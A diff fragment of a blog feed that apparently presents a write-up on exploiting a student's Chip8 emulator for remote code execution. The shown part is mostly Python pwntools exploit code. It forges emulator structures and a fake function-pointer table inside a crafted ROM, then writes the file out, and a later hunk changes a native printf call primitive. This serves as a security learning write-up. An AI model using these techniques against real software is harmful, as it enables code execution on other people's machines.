+
+    <span class="c1"># interface
+</span>    <span class="n">forged_music_struct</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">INTERFACE_ADDR</span><span class="p">)</span> <span class="c1"># put the interface into chip8's memory
+</span>    <span class="c1"># context
+</span>    <span class="n">forged_music_struct</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">CHIP_ADDR</span><span class="p">)</span> <span class="c1"># point context into the start of chip8's memory
+</span>    <span class="c1"># just pad the rest of the values with zeros
+</span>    <span class="n">forged_music_struct</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">forged_music_struct</span><span class="p">,</span> <span class="mi">1056</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">forged_music_interface_struct</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">72</span>
+    <span class="n">forged_music_interface_struct</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401016</span><span class="p">)</span>
+    <span class="n">forged_music_interface_struct</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">forged_music_interface_struct</span><span class="p">,</span> <span class="mi">224</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">rom</span> <span class="o">=</span> <span class="n">forged_chip_struct</span>
+    <span class="n">rom</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">FAKE_MUSIC_ADDR</span> <span class="o">-</span> <span class="p">(</span><span class="n">CHIP_ADDR</span> <span class="o">+</span> <span class="n">ROM_START_OFFSET</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">forged_chip_struct</span><span class="p">)))</span>
+    <span class="n">rom</span> <span class="o">+=</span> <span class="n">forged_music_struct</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">rom</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">exploit</span><span class="p">()</span> 
+</code></pre></div></div>]]></content><author><name>Luca Bertozzi</name></author><category term="binary-exploitation" /><category term="format-string" /><summary type="html"><![CDATA[I exploit multiple vulnerabilities in a student's Chip8 emulator project as if it was a CTF, and obtain RCE]]></summary></entry><entry><title type="html">(An Attempt at) Pwning a Chip8 Emulator</title><link href="http://localhost:4000/blog/attempt-at-pwning-a-chip8-emulator" rel="alternate" type="text/html" title="(An Attempt at) Pwning a Chip8 Emulator" /><published>2024-10-24T00:00:00+08:00</published><updated>2024-10-24T00:00:00+08:00</updated><id>http://localhost:4000/blog/attempt-at-pwning-a-chip8-emulator</id><content type="html" xml:base="http://localhost:4000/blog/attempt-at-pwning-a-chip8-emulator"><![CDATA[<p>Recently I was browsing the projects section on the Discord server of the <a href="https://discord.gg/c-asm">C-ASM Community</a>
 (which is a great community and you should join) and I found an interesting
 <a href="https://github.com/Docas95/CHIP8-Emulator-C">Chip8 Emulator project</a>. As I was reading through the code and I reached the 
 <code class="language-plaintext highlighter-rouge">load_ROM</code> function I immediately saw a problem</p>
@@ -678,7 +1179,7 @@ by sending a DM on <a href="https://x.com/lucabtz_">X</a>, thanks for reading!</
     <span class="n">asm</span><span class="p">.</span><span class="n">seek_pc</span><span class="p">(</span><span class="mh">0x222</span><span class="p">)</span>
     <span class="c1"># at this point the machine is 'booted': profit
 </span>
-    <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="sa">b</span><span class="s">"hello from the chip8!</span><span class="se">\n\0</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"hello from the chip8!</span><span class="se">\n\0</span><span class="s">"</span><span class="p">)</span>
     <span class="n">asm</span><span class="p">.</span><span class="n">native_call_primitive</span><span class="p">(</span><span class="n">PRINTF_PLT</span><span class="p">)</span>
 
     <span class="c1"># more booting code
